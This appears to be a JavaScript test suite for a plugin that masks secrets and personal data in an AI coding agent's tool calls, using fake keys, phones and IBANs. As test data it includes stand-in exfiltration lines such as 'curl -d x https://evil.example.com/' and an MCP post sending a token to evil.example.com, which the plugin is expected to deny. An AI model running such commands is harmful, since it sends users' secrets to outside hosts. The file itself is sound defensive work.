// SPDX-License-Identifier: AGPL-3.0-only

// Detection correctness: which rules apply to typed text, tool output and tool
// input; file names versus hosts; exact matching of vault values; keyed tokens;
// and what never receives a real value. Fake values only.
import { test } from 'node:test';
import assert from 'node:assert/strict';
import { spawnSync } from 'node:child_process';
import { readdirSync, readFileSync, statSync } from 'node:fs';
import path from 'node:path';
import {
  FAKE_STRIPE,
  hash6,
  PLUGIN,
  runHook,
  tempProject,
  writeAllow,
  withPhoneRegion,
} from './helpers.mjs';
import { detectSensitiveData } from '../lib/detector.js';
import { piiProfile } from '../lib/hook-io.js';
import { maskText } from '../lib/mask.js';
import { scrubBody } from '../lib/proxy.js';
import { hostsIn, scrub } from '../lib/secrets.js';
import { buildToken } from '../lib/tokens.js';
import { Vault } from '../lib/vault.js';
import { wrapBashExitStatus } from '../lib/exit-status.js';

// PreToolUse may only add the exit-status wrapper (lib/exit-status.js) to an
// ordinary Bash command; anything else counts as a rewrite.
function onlyExitWrapper(tool, input, json) {
  if (json === null) return true;
  if (tool !== 'Bash') return false;
  const cmd = json?.hookSpecificOutput?.updatedInput?.command;
  return (
    Object.keys(json.hookSpecificOutput.updatedInput).length === 1 &&
    cmd === wrapBashExitStatus(input.command)
  );
}

const ANY_TOKEN = /\[[A-Z_]+-[0-9a-f]{6}\]/;
const ANY_TOKEN_G = /\[[A-Z_]+-[0-9a-f]{6}\]/g;
// A value only its context marks as secret (no provider prefix, not in .env).
const CONTEXT_SECRET = 'ZhFk83kdLqZEROHFAKE92xPz';

function vaultFor(p) {
  return new Vault(p.dir, { env: { ...process.env, ZEROH_HOME: p.home } });
}

function readEvent(p, id, content, file = 'config.ini') {
  const filePath = path.join(p.dir, file);
  return {
    tool_name: 'Read',
    tool_use_id: id,
    tool_input: { file_path: filePath },
    tool_response: {
      type: 'text',
      file: {
        filePath,
        content,
        numLines: content.split('\n').length,
        startLine: 1,
        totalLines: content.split('\n').length,
      },
    },
  };
}

function readOutput(result) {
  return result.json?.hookSpecificOutput?.updatedToolOutput?.file?.content;
}

function stripeToken(p) {
  const post = runHook(
    'post-tool-use',
    {
      tool_name: 'Bash',
      tool_use_id: 'env',
      tool_input: { command: 'cat .env' },
      tool_response: { stdout: `STRIPE_KEY=${FAKE_STRIPE}\n`, stderr: '' },
    },
    { project: p },
  );
  return post.json.hookSpecificOutput.updatedToolOutput.stdout.match(
    ANY_TOKEN,
  )[0];
}

// ---- tool output uses the tool profile -------------------------------------

test('tool output is detected with the tool profile, not the typed-prompt rules', () => {
  assert.equal(piiProfile(), 'tool');
  const p = tempProject({ env: false });
  const content = [
    '# Getting Started',
    'import React from "react";',
    'export class UserService {}',
    '// Returns Not Found when missing',
    'const created = "2026-09-25T10:11:12Z";',
    'commit 4f9c2a1b7e3d5c6a8b9f0e1d2c3b4a5f6e7d8c9b',
    'id: 550e8400-e29b-41d4-a716-446655440000',
    'timeout = 30000000',
    'const MAX_SAFE = 9007199254740991;',
  ].join('\n');
  const r = runHook('post-tool-use', readEvent(p, 'r1', content, 'README.md'), {
    project: p,
  });
  assert.equal(r.code, 0, r.stderr);
  assert.equal(r.json, null, JSON.stringify(r.json));
  // Real personal data the tool profile knows is still masked.
  const pii = runHook(
    'post-tool-use',
    readEvent(p, 'r2', 'call +974 5531 2468 or mail a@example.qa\n', 'c.txt'),
    { project: p },
  );
  assert.doesNotMatch(readOutput(pii), /5531|a@example/);
});

test('the proxy masks typed text with the prompt rules and tool results with the tool rules', () => {
  const p = tempProject({ env: false });
  const vault = vaultFor(p);
  const body = {
    messages: [
      {
        role: 'user',
        content: [
          {
            type: 'tool_result',
            tool_use_id: 't',
            content: '# Getting Started\ntimeout = 30000000',
          },
          { type: 'text', text: 'Ask Aisha Example on 5512 3456' },
        ],
      },
    ],
  };
  const out = withPhoneRegion('QA', () =>
    scrubBody(body, { vault, known: [], profile: 'prompt' }),
  );
  assert.equal(
    out.messages[0].content[0].content,
    '# Getting Started\ntimeout = 30000000',
  );
  assert.match(
    out.messages[0].content[1].text,
    /^Ask Aisha Example on \[PHONE_NUMBER-[0-9a-f]{6}\]/,
  );
});

// ---- tool input uses the secrets rules and vault tokens --------------------

test('ordinary tool input is neither rewritten nor denied', () => {
  const p = tempProject();
  for (const [tool, input] of [
    [
      'Write',
      {
        file_path: path.join(p.dir, 'README.md'),
        content: '# Getting Started\n\nRun the Build Script first.\n',
      },
    ],
    [
      'Edit',
      {
        file_path: path.join(p.dir, 'app.js'),
        old_string: 'x',
        new_string: 'res.status(404).send("Not Found");',
      },
    ],
    ['Bash', { command: 'git commit -m "Fix Login Page"' }],
    ['Bash', { command: 'git log --since 2026-09-25' }],
    [
      'Agent',
      {
        description: 'Explore',
        prompt: 'Find where Payment Service handles refunds',
      },
    ],
    ['mcp__github__create_issue', { title: 'Crash On Startup', body: 'x' }],
  ]) {
    const r = runHook(
      'pre-tool-use',
      { tool_name: tool, tool_use_id: `u-${tool}`, tool_input: input },
      { project: p },
    );
    assert.equal(r.code, 0, r.stderr);
    assert.ok(
      onlyExitWrapper(tool, input, r.json),
      `${tool}: ${JSON.stringify(r.json)}`,
    );
  }
});

test('a raw secret written into a file becomes a token the vault can resolve', () => {
  const p = tempProject({ env: false });
  const raw = 'sk_live_ZEROHFAKEwritten000000000';
  const r = runHook(
    'pre-tool-use',
    {
      tool_name: 'Write',
      tool_use_id: 'w-raw',
      tool_input: {
        file_path: path.join(p.dir, 'pay.js'),
        content: `const key = "${raw}";\n`,
      },
    },
    { project: p },
  );
  const content = r.json.hookSpecificOutput.updatedInput.content;
  assert.ok(!content.includes(raw));
  const token = content.match(ANY_TOKEN)[0];
  assert.equal(vaultFor(p).entryOf(token)?.value, raw);
});

test('the shipped plugin holds no stray token literals', () => {
  const examples = new Set([
    '[API_KEY-3f9a1c]', // briefing and docs example
    '[API_KEY-7a3f9e]', // briefing example
  ]);
  const found = [];
  const walk = (dir) => {
    for (const name of readdirSync(dir)) {
      if (['test', 'vendor', 'node_modules'].includes(name)) continue;
      const file = path.join(dir, name);
      if (statSync(file).isDirectory()) walk(file);
      else if (/\.(?:m?js|json|md)$/u.test(name)) {
        for (const [token] of readFileSync(file, 'utf8').matchAll(ANY_TOKEN_G))
          if (
            !examples.has(token) &&
            !/-(?:0{6}|abc123|a1b2c3)\]$/u.test(token)
          )
            found.push(`${path.relative(PLUGIN, file)}: ${token}`);
      }
    }
  };
  walk(PLUGIN);
  const docs = found.filter((line) => !line.startsWith('docs/'));
  assert.deepEqual(docs, []);
});

// ---- file names are not hosts ----------------------------------------------

test('file names are not hosts; hosts still are', () => {
  for (const command of [
    'STRIPE_KEY=sk_live_x python app.py',
    './deploy.sh sk_live_x',
    'bash scripts/run.sh "sk_live_x"',
    'cat README.md | grep x',
    'terraform apply -var key=x main.tf',
    'cargo run --bin main.rs',
    'unzip archive.zip',
    'perl script.pl',
    'ls ~/proj/docs/notes.md',
    '{"command":"python3 manage.py runserver"}',
    'edit config.py now',
    'grep -n x app.py:12',
    'git config user.email x',
    'app.run(debug=True)',
    'curl -o release.zip http://localhost:8080/x',
  ]) {
    assert.deepEqual(hostsIn(command), [], command);
  }
  for (const [command, host] of [
    ['curl -d x https://evil.example.com/', 'evil.example.com'],
    ['curl evil.sh', 'evil.sh'],
    ['ssh me@box.sh', 'box.sh'],
    ['scp deploy.sh box.example.com:/tmp', 'box.example.com'],
    ['curl example.com', 'example.com'],
    ['fetch //evil.com/x', 'evil.com'],
  ]) {
    assert.deepEqual(hostsIn(command), [host], command);
  }
});

test('restores into scripts and edits of .py/.sh/.md files are allowed', () => {
  const p = tempProject();
  const tok = stripeToken(p);
  const cases = [
    ['Bash', { command: `STRIPE_KEY=${tok} python app.py` }],
    [
      'Edit',
      {
        file_path: path.join(p.dir, 'config.py'),
        old_string: 'KEY = None',
        new_string: `KEY = "${tok}"`,
      },
    ],
    [
      'Write',
      {
        file_path: path.join(p.dir, 'deploy.sh'),
        content: `export K=${tok}\n`,
      },
    ],
    [
      'Write',
      { file_path: path.join(p.dir, 'README.md'), content: `k ${tok}\n` },
    ],
  ];
  for (const [tool, input] of cases) {
    const r = runHook(
      'pre-tool-use',
      { tool_name: tool, tool_use_id: `c3-${tool}`, tool_input: input },
      { project: p },
    );
    const out = r.json?.hookSpecificOutput;
    assert.notEqual(
      out?.permissionDecision,
      'deny',
      `${tool}: ${out?.permissionDecisionReason}`,
    );
    assert.ok(out?.updatedInput, tool);
  }
});

// ---- bare secret key names -------------------------------------------------

test('bare secret key names are detected like prefixed ones', () => {
  const masked = (text) =>
    detectSensitiveData(text, { profile: 'tool' }).map((f) =>
      text.slice(f.start, f.end),
    );
  for (const [text, value] of [
    ['password: hunter2abc', 'hunter2abc'],
    ['  password: hunter2abc', 'hunter2abc'],
    ['token: abcdef123456', 'abcdef123456'],
    ['secret: Zq8wLmn2x', 'Zq8wLmn2x'],
    ['passwd=hunter2abc', 'hunter2abc'],
    ['pwd=hunter2abc', 'hunter2abc'],
    ['db_password: hunter2abc', 'hunter2abc'],
    ['"password": "hunter2abc"', 'hunter2abc'],
  ]) {
    assert.deepEqual(masked(text), [value], text);
  }
  for (const text of [
    'the password field is required',
    'password: string;',
    'token: Optional',
    'apiKey: config.apiKey,',
    'connect(password=password)',
    'token=access_token',
    'password = getpass()',
    'password = os.environ["X"]',
    'tokenizer: bert-base-uncased',
    'secrets: inherit',
    'credentials: include',
    'password:\n  from_env: X',
    'PWD=/home/me/proj',
    'pwd=$(pwd)',
    // Optional chaining and index access are code, not values.
    'const token = observation?.token;',
    'token: replacement?.replacement || replacement?.token,',
    'controlToken: config?.controlToken,',
    'const secret = matched[1];',
    "const token = tokens[index].replace(/x/, '');",
    'const secret = match[rule.secretGroup ?? 0];',
  ]) {
    assert.deepEqual(masked(text), [], text);
  }
});

// ---- every vault value is matched exactly ----------------------------------

test('a value masked by its context stays masked when it comes back bare', () => {
  const p = tempProject({ env: false });
  const first = runHook(
    'post-tool-use',
    readEvent(p, 'rr1', `[db]\ndb_password = "${CONTEXT_SECRET}"\n`),
    { project: p },
  );
  const masked = readOutput(first);
  assert.ok(!masked.includes(CONTEXT_SECRET));
  const tok = masked.match(ANY_TOKEN)[0];

  // Edit restores the value into a file (by design) ...
  const edit = runHook(
    'pre-tool-use',
    {
      tool_name: 'Edit',
      tool_use_id: 'e1',
      tool_input: {
        file_path: path.join(p.dir, 'app.js'),
        old_string: 'x',
        new_string: `const pw = "${tok}";`,
      },
    },
    { project: p },
  );
  assert.equal(
    edit.json.hookSpecificOutput.updatedInput.new_string,
    `const pw = "${CONTEXT_SECRET}";`,
  );
  // ... and every way it comes back is masked with the same token.
  const reread = runHook(
    'post-tool-use',
    readEvent(p, 'rr2', `const pw = "${CONTEXT_SECRET}";\n`, 'app.js'),
    { project: p },
  );
  assert.equal(readOutput(reread), `const pw = "${tok}";\n`);
  const encoded = Buffer.from(CONTEXT_SECRET).toString('base64');
  const printed = runHook(
    'post-tool-use',
    {
      tool_name: 'Bash',
      tool_use_id: 'b1',
      tool_input: { command: `printf '%s\\n' ${tok}` },
      tool_response: {
        stdout: `${CONTEXT_SECRET}\n${encoded}\n${encodeURIComponent(CONTEXT_SECRET)}\n`,
        stderr: '',
      },
    },
    { project: p },
  );
  const stdout = printed.json.hookSpecificOutput.updatedToolOutput.stdout;
  assert.ok(!stdout.includes(CONTEXT_SECRET));
  assert.ok(!stdout.includes(encoded));
  assert.equal(stdout.split('\n')[0], tok);

  // The proxy matches it too, in tool results and typed text.
  const body = {
    messages: [
      {
        role: 'user',
        content: [
          {
            type: 'tool_result',
            tool_use_id: 'x',
            content: `pw ${CONTEXT_SECRET}`,
          },
          { type: 'text', text: `is ${CONTEXT_SECRET} right?` },
        ],
      },
    ],
  };
  const proxied = JSON.stringify(
    scrubBody(body, { vault: vaultFor(p), known: [], profile: 'prompt' }),
  );
  assert.ok(!proxied.includes(CONTEXT_SECRET));
  assert.ok(proxied.includes(tok));

  // A typed prompt that pastes it back is stopped (proxy off).
  const typed = runHook(
    'user-prompt-submit',
    { prompt: `use ${CONTEXT_SECRET} please` },
    { project: p },
  );
  assert.equal(typed.code, 2, typed.stderr);
  assert.ok(!typed.stderr.includes(CONTEXT_SECRET));
});

test('legacy prose entries in the vault are not matched exactly', () => {
  const p = tempProject({ env: false });
  const vault = vaultFor(p);
  vault.tokenFor('PERSON', 'Getting Started', 'detected');
  vault.tokenFor('PHONE_NUMBER', '30000000', 'detected');
  vault.tokenFor('PASSWORD', CONTEXT_SECRET, 'detected');
  const out = scrub(
    `# Getting Started\ntimeout = 30000000\n${CONTEXT_SECRET}`,
    {
      vault,
      known: [],
    },
  );
  assert.equal(out.text.split('\n')[0], '# Getting Started');
  assert.equal(out.text.split('\n')[1], 'timeout = 30000000');
  assert.match(out.text.split('\n')[2], /^\[PASSWORD-[0-9a-f]{6}\]$/);
});

test('the exact matcher stays fast with thousands of vault entries', () => {
  const p = tempProject({ env: false });
  const vault = vaultFor(p);
  for (let i = 0; i < 3000; i += 1)
    vault.tokenFor(
      'PASSWORD',
      `ZEROHFAKE-${i.toString(36)}-value-${i}`,
      'detected',
    );
  const last999 = `ZEROHFAKE-${(2999).toString(36)}-value-2999`;
  const text = `${'ordinary log line with nothing secret in it\n'.repeat(20000)}${last999}\n`;
  const started = Date.now();
  let last;
  for (let i = 0; i < 5; i += 1) last = scrub(text, { vault, known: [] });
  assert.ok(/\[PASSWORD-[0-9a-f]{6}\]\n$/.test(last.text.slice(-40)));
  assert.equal(last.replacements.length, 1);
  assert.ok(Date.now() - started < 10_000, `took ${Date.now() - started} ms`);
});

// ---- keyed tokens ----------------------------------------------------------

test('tokens are keyed per install and stable within one', () => {
  const a = tempProject({ env: false });
  const b = tempProject({ env: false });
  const phone = '+974 5531 2468';
  const tokenA = vaultFor(a).tokenFor('PHONE_NUMBER', phone, 'prompt');
  const tokenA2 = new Vault(path.join(a.dir, 'other'), {
    env: { ...process.env, ZEROH_HOME: a.home },
  }).tokenFor('PHONE_NUMBER', phone, 'prompt');
  const tokenB = vaultFor(b).tokenFor('PHONE_NUMBER', phone, 'prompt');
  assert.equal(tokenA, tokenA2);
  assert.notEqual(tokenA, tokenB);
  // The unkeyed 0.x hash no longer names the value.
  assert.notEqual(tokenA, buildToken('PHONE_NUMBER', phone, 0, hash6));
  assert.match(tokenA, /^\[PHONE_NUMBER-[0-9a-f]{6}\]$/);
});

test('tokens already in a vault keep their name; new values get keyed tokens', () => {
  const p = tempProject({ env: false });
  const env = { ...process.env, ZEROH_HOME: p.home };
  const legacy = new Vault(p.dir, { env, hash: hash6 });
  const old = legacy.tokenFor('API_KEY', FAKE_STRIPE, 'detected');
  assert.equal(old, buildToken('API_KEY', FAKE_STRIPE, 0, hash6));
  legacy.save();
  const current = new Vault(p.dir, { env });
  assert.equal(current.tokenFor('API_KEY', FAKE_STRIPE, 'detected'), old);
  assert.equal(current.entryOf(old).value, FAKE_STRIPE);
  const fresh = current.tokenFor('API_KEY', `${FAKE_STRIPE}1`, 'detected');
  assert.notEqual(fresh, buildToken('API_KEY', `${FAKE_STRIPE}1`, 0, hash6));
});

test('the typed-prompt engine mints the same keyed token as the vault', async () => {
  const p = tempProject({ env: false });
  const prev = process.env.ZEROH_HOME;
  process.env.ZEROH_HOME = p.home;
  try {
    const text = 'mail a@example.qa';
    const findings = detectSensitiveData(text, { profile: 'prompt' });
    const masked = await maskText(text, findings, {
      hmacKeyBytes: Buffer.alloc(32, 1),
    });
    const token = masked.replacements[0].replacement;
    assert.equal(vaultFor(p).tokenFor('EMAIL', 'a@example.qa'), token);
    assert.notEqual(token, buildToken('EMAIL', 'a@example.qa', 0, hash6));
  } finally {
    if (prev === undefined) delete process.env.ZEROH_HOME;
    else process.env.ZEROH_HOME = prev;
  }
});

// ---- model-bound and unchecked inputs get no real values ---------------

test('real values never go into subagent prompts, WebFetch prompts or unchecked MCP input', () => {
  const p = tempProject();
  const tok = stripeToken(p);
  const pre = (tool, input) =>
    runHook(
      'pre-tool-use',
      { tool_name: tool, tool_use_id: `r3-${tool}`, tool_input: input },
      { project: p },
    );
  const leaks = (r) => JSON.stringify(r.json ?? {}).includes('ZEROHFAKE');

  const agent = pre('Agent', { description: 'x', prompt: `Use key ${tok}` });
  assert.ok(!leaks(agent));
  assert.equal(agent.json.hookSpecificOutput.updatedInput, undefined);
  assert.match(agent.json.hookSpecificOutput.additionalContext, /as tokens/);

  const fetch = pre('WebFetch', {
    url: `https://api.stripe.com/v1/x?k=${tok}`,
    prompt: `summarise; the key is ${tok}`,
  });
  const fetched = fetch.json.hookSpecificOutput.updatedInput;
  assert.ok(fetched.url.includes(FAKE_STRIPE));
  assert.equal(fetched.prompt, `summarise; the key is ${tok}`);

  // MCP tools get tokens unless the user allowed the server (mcp:<server>);
  // hosts, allowed or loopback, in the input never count (N1).
  const held = (r) => {
    assert.ok(!leaks(r));
    assert.equal(r.json.hookSpecificOutput.permissionDecision, undefined);
    assert.equal(r.json.hookSpecificOutput.updatedInput, undefined);
    assert.match(r.json.hookSpecificOutput.additionalContext, /stays masked/);
  };
  const calls = {
    remote: ['mcp__claude_ai_Google_Drive__create_file', { content: tok }],
    evil: ['mcp__local__post', { url: 'https://evil.example.com', body: tok }],
    stripe: [
      'mcp__local__post',
      { url: 'https://api.stripe.com/v1/charges', body: tok },
    ],
    loopback: [
      'mcp__local__post',
      { url: 'http://localhost:8080/hook', body: tok },
    ],
  };
  for (const [tool, input] of Object.values(calls)) held(pre(tool, input));

  writeAllow(p, { STRIPE_KEY: ['mcp:local'] });
  held(pre(...calls.remote));
  assert.equal(
    pre(...calls.evil).json.hookSpecificOutput.permissionDecision,
    'deny',
  );
  for (const call of [calls.stripe, calls.loopback]) {
    assert.equal(
      pre(...call).json.hookSpecificOutput.updatedInput.body,
      FAKE_STRIPE,
    );
  }

  const own = pre(
    'mcp__plugin_zeroh-disclosure_zeroh-disclosure__report_missed_secret',
    {
      value: tok,
      where: 'x',
      why: 'y',
    },
  );
  assert.ok(!leaks(own));
  assert.equal(own.json?.hookSpecificOutput?.updatedInput, undefined);
});

// ---- named-form markers do not split context ---------------------------

test('a value right before or after a ⟦…⟧ marker is still masked', () => {
  const p = tempProject({ env: false });
  for (const text of [
    `db_password = "${CONTEXT_SECRET}" ⟦PASSWORD-000000⟧`,
    `db_password = "⟦PASSWORD-000000⟧${CONTEXT_SECRET}"`,
    `db_password = ⟦PASSWORD-000000⟧${CONTEXT_SECRET}`,
  ]) {
    const r = runHook(
      'post-tool-use',
      {
        tool_name: 'Bash',
        tool_use_id: `m-${text.length}`,
        tool_input: { command: 'x' },
        tool_response: { stdout: text, stderr: '' },
      },
      { project: p },
    );
    const out = r.json?.hookSpecificOutput?.updatedToolOutput?.stdout ?? text;
    assert.ok(!out.includes(CONTEXT_SECRET), `${text} -> ${out}`);
    assert.ok(out.includes('⟦PASSWORD-000000⟧'), out);
  }
});

// ---- imported provider rules mask the secret group (fake values) ------------

test('an imported-only format is masked on Read, re-masked bare, and restored as the value alone', () => {
  for (const [file, line, value] of [
    [
      'algolia.yml',
      'algolia_key: "0123456789abcdef0123456789abcdef"',
      '0123456789abcdef0123456789abcdef',
    ],
    [
      'datadog.ini',
      'datadog_api_key = "0123456789abcdef0123456789abcdef01234567"',
      '0123456789abcdef0123456789abcdef01234567',
    ],
  ]) {
    const p = tempProject({ env: false });
    const read = readOutput(
      runHook('post-tool-use', readEvent(p, 'imp-read', `${line}\n`, file), {
        project: p,
      }),
    );
    assert.ok(!read.includes(value), read);
    const tok = read.match(ANY_TOKEN)[0];
    // Only the value became the token; the key name stays readable.
    assert.equal(read, `${line.replace(value, tok)}\n`);
    assert.equal(vaultFor(p).entryOf(tok)?.value, value);

    const later = runHook(
      'post-tool-use',
      {
        tool_name: 'Bash',
        tool_use_id: 'imp-bare',
        tool_input: { command: 'node check.js' },
        tool_response: { stdout: `value is ${value}\n`, stderr: '' },
      },
      { project: p },
    );
    assert.equal(
      later.json.hookSpecificOutput.updatedToolOutput.stdout,
      `value is ${tok}\n`,
    );

    const pre = runHook(
      'pre-tool-use',
      {
        tool_name: 'Bash',
        tool_use_id: 'imp-restore',
        tool_input: { command: `printf '%s' ${tok} > restored.txt` },
      },
      { project: p },
    );
    const command = pre.json.hookSpecificOutput.updatedInput.command;
    assert.ok(!command.includes(value), 'late-bound, not inline');
    const run = spawnSync('bash', ['-c', command], {
      cwd: p.dir,
      encoding: 'utf8',
    });
    assert.equal(run.status, 0, run.stderr);
    assert.equal(readFileSync(path.join(p.dir, 'restored.txt'), 'utf8'), value);
  }
});

// ---- personal-data shapes (fake values) --------------------------------------

test('SSH logins and service addresses are not emails; git remotes pass', () => {
  const found = (text, profile = 'tool') =>
    detectSensitiveData(text, { profile }).map((f) => [
      f.type,
      text.slice(f.start, f.end),
    ]);
  for (const text of [
    'origin\tgit@github.com:acme/shop.git (fetch)',
    '"url": "git+ssh://git@github.com/acme/shop.git"',
    'git clone git@gitlab.example.com:acme/shop.git',
    'rsync -a dist/ deploy@web.example.com:/srv/app',
    'ssh://deploy@host.example.com/srv/repo.git',
    'Co-authored-by: Claude <noreply@anthropic.com>',
    'Author: Dev <1234567+dev@users.noreply.github.com>',
  ]) {
    assert.deepEqual(found(text), [], text);
    assert.deepEqual(found(text, 'prompt'), [], text);
  }
  assert.deepEqual(found('mail jane.doe@example.com: thanks'), [
    ['EMAIL', 'jane.doe@example.com'],
  ]);

  const p = tempProject({ env: false });
  const remote = runHook(
    'post-tool-use',
    {
      tool_name: 'Bash',
      tool_use_id: 'git-remote',
      tool_input: { command: 'git remote -v' },
      tool_response: {
        stdout: 'origin\tgit@github.com:acme/shop.git (fetch)\n',
        stderr: '',
      },
    },
    { project: p },
  );
  assert.equal(remote.json, null, JSON.stringify(remote.json));
  const clone = runHook(
    'pre-tool-use',
    {
      tool_name: 'Bash',
      tool_use_id: 'git-clone',
      tool_input: { command: 'git clone git@github.com:acme/shop.git' },
    },
    { project: p },
  );
  assert.notEqual(clone.json?.hookSpecificOutput?.permissionDecision, 'deny');
});

test('digit groups that are sizes, counts, dates or diff lines are not phones or IDs', () => {
  const found = (text, profile) =>
    detectSensitiveData(text, { profile }).map((f) => [
      f.type,
      text.slice(f.start, f.end),
    ]);
  for (const text of [
    'Resize the images to 1920 1080 and 1280 720',
    'buffer sizes are 2048 4096 8192',
    'the timeout is 30 000 000 microseconds',
    'we sold 1.250.000 units',
    'account 30012345678',
    'build stamp 20260925101 finished',
    'value -2.42859224204858 and 0.30012345678',
  ]) {
    assert.deepEqual(found(text, 'prompt'), [], text);
  }
  const diff =
    'diff --git a/sizes.txt b/sizes.txt\n@@ -1,2 +1,2 @@\n-1024\n+2048 4096 8192\n+1 2026 0925 1011\n+30012345678\n';
  assert.deepEqual(found(diff, 'tool'), []);
  assert.deepEqual(found(diff, 'prompt'), []);
  // Real numbers still count.
  assert.deepEqual(found('call +974 5512 3456', 'tool'), [
    ['PHONE_NUMBER', '+974 5512 3456'],
  ]);
  // A Qatar ID counts next to a word naming it.
  assert.deepEqual(found('my QID is 28463400123', 'prompt'), [
    ['QATAR_ID', '28463400123'],
  ]);
  assert.deepEqual(found('account 28463400123', 'prompt'), []);
  // A national number needs a default region.
  assert.deepEqual(found('call me on 5512 3456', 'prompt'), []);
  assert.deepEqual(
    withPhoneRegion('QA', () => found('call me on 5512 3456', 'prompt')),
    [['PHONE_NUMBER', '5512 3456']],
  );
});

test('IBANs need a country length and the mod-97 checksum, compact or grouped', () => {
  const found = (text) =>
    detectSensitiveData(text, { profile: 'tool' }).map((f) => [
      f.type,
      text.slice(f.start, f.end),
    ]);
  for (const iban of [
    'GB29NWBK60161331926819',
    'GB29 NWBK 6016 1331 9268 19',
    'GB82 WEST 1234 5698 7654 32',
    'DE89 3704 0044 0532 0130 00',
    'QA58DOHB00001234567890ABCDEFG',
  ]) {
    assert.deepEqual(found(`pay to ${iban} today`), [['IBAN', iban]], iban);
  }
  for (const text of [
    'AB12CDEF3456789012',
    'QX2024123456789ABCD',
    'GB29NWBK60161331926818',
    'GB29 NWBK 6016 1331 9268 18',
  ]) {
    assert.deepEqual(found(text), [], text);
  }
});

test('a value found by its key matches later text only as a whole word', () => {
  const p = tempProject({ env: false });
  const vault = vaultFor(p);
  vault.tokenFor('PASSWORD', 'hunter2abc', 'detected');
  // Pre-1.0 vaults can hold code taken for a value; it is never matched.
  vault.tokenFor('API_KEY', 'API_KEY', 'detected');
  vault.tokenFor('SECRET', 'SECRET_KEY', 'detected');
  const out = scrub(
    'pw hunter2abc; hunter2abcdef MY_hunter2abc\nexport STRIPE_API_KEY DJANGO_SECRET_KEY\n',
    { vault, known: [] },
  ).text;
  const tok = vault.tokenFor('PASSWORD', 'hunter2abc', 'detected');
  assert.equal(
    out,
    `pw ${tok}; hunter2abcdef MY_hunter2abc\nexport STRIPE_API_KEY DJANGO_SECRET_KEY\n`,
  );
});

// ---- key-name rules: values, not code (fake values) --------------------------

test('key-name rules take values with digits or symbols, never code or names', () => {
  const masked = (text) =>
    detectSensitiveData(text, { profile: 'tool' }).map((f) =>
      text.slice(f.start, f.end),
    );
  for (const [text, value] of [
    ['password: Summer2024', 'Summer2024'],
    ['secret: "Xk82!pwQzz"', 'Xk82!pwQzz'],
    ['api_key = "abc123def456"', 'abc123def456'],
    ['DB_PASSWORD=Zf4keDbPass!9', 'Zf4keDbPass!9'],
    ['Server=db;Password=Sup3rS3cret;', 'Sup3rS3cret'],
  ]) {
    assert.deepEqual(masked(text), [value], text);
  }
  for (const text of [
    'const JWT_SECRET = process.env.JWT_SECRET!;',
    'export default { apiKey: API_KEY, secret: SECRET_KEY };',
    '"jsonwebtoken": "^9.0.2",',
    'resolveDimension: (token: CSSToken) => number;',
    'getAccessToken: (scopes: string[]) => Promise<AccessToken>;',
    'passphrase: <string>]',
    'privateKey: CryptoKey;',
    'SessionToken: "x-ms-session-token",',
    'PASSWORD_TOO_WEAK = "password_too_weak";',
    'ACQUIRE_TOKEN_SUCCESS: "msal:acquireTokenSuccess",',
    'token: {{ api_token }}',
    'secret: "%(password)s"',
    'password: ${DB_PASSWORD}',
    'const { continuationToken: continuationToken2 } = page;',
    'token          = 1*tchar',
    'def read(self, name, pwd=None):',
    'socks5://user:pass@localhost:1080',
    '.password-strength-meter { width: 100%; }',
  ]) {
    assert.deepEqual(masked(text), [], text);
  }
});

test('a key-name value in model-written input is left alone; its output is masked', () => {
  const p = tempProject({ env: false });
  const content = 'db:\n  password: hunter2abc\n';
  const write = runHook(
    'pre-tool-use',
    {
      tool_name: 'Write',
      tool_use_id: 'kn-write',
      tool_input: { file_path: path.join(p.dir, 'config.yml'), content },
    },
    { project: p },
  );
  assert.equal(write.json, null, JSON.stringify(write.json));
  const read = readOutput(
    runHook('post-tool-use', readEvent(p, 'kn-read', content, 'config.yml'), {
      project: p,
    }),
  );
  assert.match(read, /password: \[PASSWORD-[0-9a-f]{6}\]/);
  // A provider-format key the model writes is still turned into a token.
  const provider = runHook(
    'pre-tool-use',
    {
      tool_name: 'Write',
      tool_use_id: 'kn-provider',
      tool_input: {
        file_path: path.join(p.dir, 'pay.js'),
        content: 'const key = "sk_live_ZEROHFAKEwritten000000000";\n',
      },
    },
    { project: p },
  );
  assert.match(
    provider.json.hookSpecificOutput.updatedInput.content,
    /\[API_KEY-[0-9a-f]{6}\]/,
  );
});
